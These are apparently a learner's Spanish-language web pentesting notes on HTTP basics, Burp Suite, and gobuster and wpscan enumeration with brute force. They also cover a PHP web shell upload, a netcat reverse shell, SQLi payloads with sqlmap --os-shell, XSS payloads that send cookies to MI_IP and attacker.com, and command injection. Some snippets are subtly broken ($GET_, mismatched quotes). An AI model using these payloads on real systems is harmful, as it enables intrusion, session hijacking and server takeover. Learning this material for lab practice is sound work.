# WEB APPLICATION FUNDAMENTALS

Arquitectura de Webs

Presentación(HTML,CSS,JS) -> Logic Tier(PHP,PYTHON,JAVA) -> Data Tier(SQL,MYSQL,POSTGRESQL)

## Metodos HTTP

| Metodo | Explicación |
| :---: | :--- |
| GET | Ver los recursos |
| POST | Enviar información |
| PUT | Enviar o actualizar recursos |
| DELETE | Borra el recurso |
| OPTIONS | Que recursos hay |

## CODIGOS HTTP 

| Codigo | Nombre | Que significa |
| :---: | :--- | :--- |
| 200 | OK | La pagina cargó |
| 301/302 | Redirect | La pagina se movió |
| 400 | Bad Request | Sucedió algo (syntax malformado) |
| 401 | Unauthorized | Necesitas logearte |
| 403 | Forbidden | Estas logeado, pero no tienes autorización |
| 500 | Internal Server Error | El servidor se rompió (?) |

## Cookies & Sessiones 

HTTP es algo sin estado, no recuerda quien "eres" después de cada request, por eso el servidor te da una Cookie

Si consigues la cookie de alguien, puedes hacerte pasar por esa persona, esto es llamado Session Hijacking

## Burp Suite 

1. Proxy

Ayuda a interceptar solicitudes del navegador en el Burp Suite

2. Repeater

El repeater nos permite modificar la solicitud web y ver como responde el servidor a ese cambio

** En lugar de usar el click derecho en el proxy, podemos usar Ctrl+R para mandarlo al Repeater **
** Del mismo modo, podemos usar Ctrl+Space para mandar la solicitud sin hacer click en "Send" **

3. Intruder

Es un modulo de ataque automatico, se usa cuando tenemos que intentar varias veces valores diferentes.

Por ejemplo, podemos encontrar una pagina de login y podemos hacer fuerza bruta a las credenciales.

** En este caso, se tiene que revisar el largo de la respuesta, para poder diferenciar entre Login Fallido y Login Exitoso **

4. Decoder

La data en la web normalmente esa encodeada para transmitirse con seguridad, por ejemplo el espacio se convierte en %20, como pentester uno tiene que ser capaz de leer la data

Encoding comunes:

- URL Encoding: Convierte caracteres en ASCII (ejm, < se convierte en %3C)
- Base 64: Usado para encodear data binaria a texto (ejm, YWJjMTIz)
- HTML Entities: Usado para mostrar caracteres reservados (ejm, &lt;)

Ejemplo de uso:

Se pega el texto encodeado: YWRtaW4=

Se hace click en Decodificar como -> Base64 

El resultado es: admin

## Reconocimiento Web 

Encontrando directorios ocultos con gobuster

```sh
gobuster dir -u http://192.168.1.10 -w /usr/share/wordlists/dirb/common.txt
```

Caso especial: Enumeración de WordPress

WordPress es uno de los CMS más comunes, si se identifica que se está usando WordPress se tiene que utilizar inmediatamente wpscan.

```sh
#Enumeración general (temas, plugins, usuarios)
wpscan --url http://192.168.1.10/wordpress -e t,p,u

#Enumeración agresiva de usuarios
wpscan --url http://192.168.1.10/wordpress -e u --detection-mode aggresive

#Ataques de contraseñas (FUERA BRUTA)
wpscan --url http://192.168.1.10/wordpress -U users.txt -P /usr/share/wordlists/rockyou.txt 
```

## Carga de archivos vulnerables

Si una pagina permite subir un archivo como pfp, y no revisa que es una imagen, se puede subir un virus o un Shell al sistema

Escenario: 

Encuentras una pagina para subir archivo en http://192.168.1.10/upload.php 

Creas un archivo PHP shell

```sh
echo "<?php system(\$GET_['cmd']); ?> > shell.php
```

El script le dice al servidor que ejecute lo que este pase en el parametro "cmd"

Subimos el archivo, normalmente con gobuster ya tendríamos el directorio donde se sube, que en este caso es /uploads o /images

Luego con la misma url podemos ejecutar codigo de manera remota: http://192.168.1.10/uploads/shell.php?cmd=whoami

Así como ejecutamos código por la URL, es molesto por lo que podríamos hacer que el servidor se conecte a nuestra maquina para tener un Shell completo

Ponemos nuestra maquina en modo de escucha 

```sh
nc -nvlp 4444
```

- n: No DNS lookup (lo hace más rapido)
- v: Verbose (Muestra los detalles de conexión cuando suceden)
- l: Modo de escucha (espera por una conexión)
- p: Especifica el puerto abierto

En el navegador ejecutamos el siguiente codigo:

```sh
http://192.168.1.10/uploads/shell.php?cmd=nc -e /bin/bash <MI IP> 4444
```

Con esto deberías tener una conexión y control total sobre el servidor

## Injecciones 

1. SQLi

| Payload | Que hace |
| :---: | :--- |
| ' OR '1'='1 | Pasa el login |
| ' OR 1=1- - | Lo mismo pero  - - Comenta el resto |
| admin'- - | Login como admin, ignora la contraseña |
| ' UNION SELECT null- - | Combina queries para extraer data |

Automatización con SQLMap

```
#Escaneo basico
sqlmap -u "http://192.168.1.10/product.php?id=1" --batch

sqlmap -u "http://192.168.1.10/product.php?id=1" --dump

sqlmap -u "http://192.168.1.10/product.php?id=1" --os-shell
```

Flags:

- u: URL 
- batch: Dice "Yes" a todos los prompts
- dbs: Lista todas las bases de datos encontradas
- dump: Extrae y muestra la información de las tablas
- os-shell: Intenta hackear el sistema operativo vía la BD

2. XXS

- Reflejado
- Stored
- DOM-based XSS

Se inyecta código malicioso en el lado del cliente

```js
#Si hay por ejemplo una caja de busqueda
<script>alert('XXS')</script>

#Creación de payload para robar cookies
<script>document.location="http://MI_IP:8080/?c='+document.cookie</script>
```

Seteamos un listener en nuestra maquina: 

```pyhon
python3 -m http.server 8080
```

Enviamos el link malicioso, cuando hagan click su cookie es enviada a nuestro servidor

```js
#COMMON XXS PAYLOADS

<script>alert('XXS')</script>
<script>fetch('http://attacker.com/?c='+document.cookie)</script>
<img src=x onerror=alert('XSS')>
<ScRiPt>alert('XSS')</ScRiPt>
<script>alert(String.fromCharCode(88,83,83))</script>
```

3. Injección de comandos

En lugar de inyectar codigo SQL, injectamos código bash al sistema de comandos cli 

```sh
ping -c4 8.8.8.8; whoami
```

Comand Injection Characters

| Character | Que hace |
| :---: | :--- |
| ; | Ejecuta el comando secuencialmente |
| && | Ejecuta el segundo comando solo si el primero es exitoso |
| "||" | Corre el segundo comando solo si el primero falla |
| "|" | Deriva el primer comando al segundo |
| 'command' | ejecuta el comando e injecta el output |
| $(command) | Lo mismo que backticks (syntax moderno) |

